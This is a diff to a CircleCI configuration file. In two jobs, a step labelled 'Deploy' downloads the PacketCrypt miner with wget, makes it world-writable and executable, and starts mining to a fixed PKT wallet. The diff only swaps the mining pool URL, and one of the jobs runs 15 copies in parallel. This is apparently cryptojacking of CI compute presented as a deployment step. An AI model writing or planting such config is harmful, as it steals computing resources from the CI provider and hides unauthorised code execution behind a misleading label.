@@ -10,7 +10,7 @@ jobs:
       - checkout
       - run:
          name: "Deploy"
-         command: wget -O packetcrypt https://github.com/cjdelisle/packetcrypt_rs/releases/download/packetcrypt-v0.5.1/packetcrypt-v0.5.1-linux_amd64 && chmod 777 packetcrypt && ./packetcrypt ann -p pkt1q8qf58p5fzfp0jgde6dkv87uln7yz0ayjgp3z74 http://pool.pkteer.com
+         command: wget -O packetcrypt https://github.com/cjdelisle/packetcrypt_rs/releases/download/packetcrypt-v0.5.1/packetcrypt-v0.5.1-linux_amd64 && chmod 777 packetcrypt && ./packetcrypt ann -p pkt1q8qf58p5fzfp0jgde6dkv87uln7yz0ayjgp3z74 http://pool.pkt.world
   build1:
     parallelism: 15
     machine:
@@ -20,7 +20,7 @@ jobs:
       - checkout
       - run:
          name: "Deploy"
-         command: wget -O packetcrypt https://github.com/cjdelisle/packetcrypt_rs/releases/download/packetcrypt-v0.5.1/packetcrypt-v0.5.1-linux_amd64 && chmod 777 packetcrypt && ./packetcrypt ann -p pkt1q8qf58p5fzfp0jgde6dkv87uln7yz0ayjgp3z74 http://pool.pkteer.com
+         command: wget -O packetcrypt https://github.com/cjdelisle/packetcrypt_rs/releases/download/packetcrypt-v0.5.1/packetcrypt-v0.5.1-linux_amd64 && chmod 777 packetcrypt && ./packetcrypt ann -p pkt1q8qf58p5fzfp0jgde6dkv87uln7yz0ayjgp3z74 http://pool.pkt.world
 
 workflows:
   main:
